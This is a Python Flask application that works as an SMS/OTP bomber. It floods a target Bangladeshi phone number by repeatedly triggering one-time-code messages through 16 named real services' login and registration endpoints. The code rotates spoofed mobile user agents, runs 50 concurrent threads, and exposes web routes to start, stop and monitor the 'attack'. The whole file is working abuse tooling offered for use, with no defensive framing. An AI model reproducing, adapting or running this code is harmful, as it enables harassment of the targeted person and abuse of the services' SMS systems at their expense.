from flask import Flask, render_template, request, jsonify
import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# --- GLOBAL STATE ---
attack_state = {
    "running": False,
    "total_sent": 0,
    "logs": []
}

# --- 16 POWERFUL APIs ---
session = requests.Session()

def get_headers():
    ua_list = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
    ]
    return {"User-Agent": random.choice(ua_list), "Content-Type": "application/json"}

# List of API Functions
def api_1(num): 
    try: session.post("https://api.redx.com.bd/v1/user/request-login-code", json={"phone": num}, headers=get_headers(), timeout=4); return "RedX"
    except: return None

def api_2(num): 
    try: session.post("https://auth.10minuteschool.com/api/v4/register/otp", json={"phone": num}, headers=get_headers(), timeout=4); return "10MS"
    except: return None

def api_3(num): 
    try: session.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", headers=get_headers(), timeout=4); return "Bikroy"
    except: return None

def api_4(num): 
    try: session.post("https://developer.quizgiri.xyz/api/v2.0/send-otp", json={"phone": num, "country_code": "+880"}, headers=get_headers(), timeout=4); return "Quizgiri"
    except: return None

def api_5(num): 
    try: session.post("https://api.swap.com.bd/api/v1/send-otp", json={"phone": num, "type": "login"}, headers=get_headers(), timeout=4); return "Swap"
    except: return None

def api_6(num): 
    try: session.post("https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner=", json={"mobile": "+88"+num}, headers=get_headers(), timeout=4); return "Arogga"
    except: return None

def api_7(num):
    try: session.post("https://api.paperfly.com.bd/api/v1/merchant/registration/check-mobile", json={"mobile_number": num}, headers=get_headers(), timeout=4); return "Paperfly"
    except: return None

def api_8(num):
    try: session.post("https://danafintech.com/api/v1/auth/otp", json={"mobile": num}, headers=get_headers(), timeout=4); return "Dana"
    except: return None

def api_9(num):
    try: session.post("https://api.bongobd.com/api/login/send-otp", json={"operator": "all", "msisdn": "88"+num}, headers=get_headers(), timeout=4); return "BongoBD"
    except: return None

def api_10(num):
    try: session.post("https://prod-api.hoichoi.tv/api/v1/auth/signinup/code", json={"phoneNumber": "88"+num, "countryCode": "BD", "deviceId": "web", "deviceModel": "chrome"}, headers=get_headers(), timeout=4); return "Hoichoi"
    except: return None

def api_11(num):
    try: session.post("https://api.chardike.com/api/otp/send", json={"mobile_number": num}, headers=get_headers(), timeout=4); return "Chardike"
    except: return None

def api_12(num):
    try: session.post("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", json={"msisdn": "88"+num}, headers=get_headers(), timeout=4); return "Deepto"
    except: return None

def api_13(num):
    try: session.post("https://apialpha.pbs.com.bd/api/OTP/generateOTP", json={"phoneNumber": num}, headers=get_headers(), timeout=4); return "PBS"
    except: return None

def api_14(num):
    try: session.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": num, "auth_type": "login"}, headers=get_headers(), timeout=4); return "Shikho"
    except: return None

def api_15(num):
    try: session.post("https://frontendapi.kireibd.com/api/v2/send-login-otp", json={"phone": num, "type": "customer_login"}, headers=get_headers(), timeout=4); return "Kirei"
    except: return None

def api_16(num):
    try: session.post("https://api.chorki.com/v2/auth/login?country=BD", json={"msisdn": "88"+num}, headers=get_headers(), timeout=4); return "Chorki"
    except: return None

# --- ENGINE ---
def attack_logic(number, amount):
    if number.startswith("+88"): num = number[3:]
    elif number.startswith("880"): num = number[2:]
    else: num = number

    apis = [api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10, api_11, api_12, api_13, api_14, api_15, api_16]
    
    # 50 Threads for Server
    with ThreadPoolExecutor(max_workers=50) as executor:
        while attack_state['running'] and attack_state['total_sent'] < amount:
            random.shuffle(apis)
            futures = [executor.submit(api, num) for api in apis]
            
            for f in futures:
                if not attack_state['running']: break
                res = f.result()
                if res:
                    attack_state['total_sent'] += 1
                    attack_state['logs'].append(f"[SUCCESS] Sent via {res} -> {number}")
                    if len(attack_state['logs']) > 50: attack_state['logs'].pop(0)
            
            time.sleep(0.1)

    attack_state['running'] = False
    attack_state['logs'].append("[!] ATTACK FINISHED")

# --- ROUTES ---
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    data = request.json
    attack_state['running'] = True
    attack_state['total_sent'] = 0
    attack_state['logs'] = ["[*] Server Initialized...", "[*] Targeting " + data['number']]
    
    threading.Thread(target=attack_logic, args=(data['number'], int(data['amount']))).start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop():
    attack_state['running'] = False
    return jsonify({"status": "stopped"})

@app.route('/status')
def status():
    return jsonify(attack_state)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)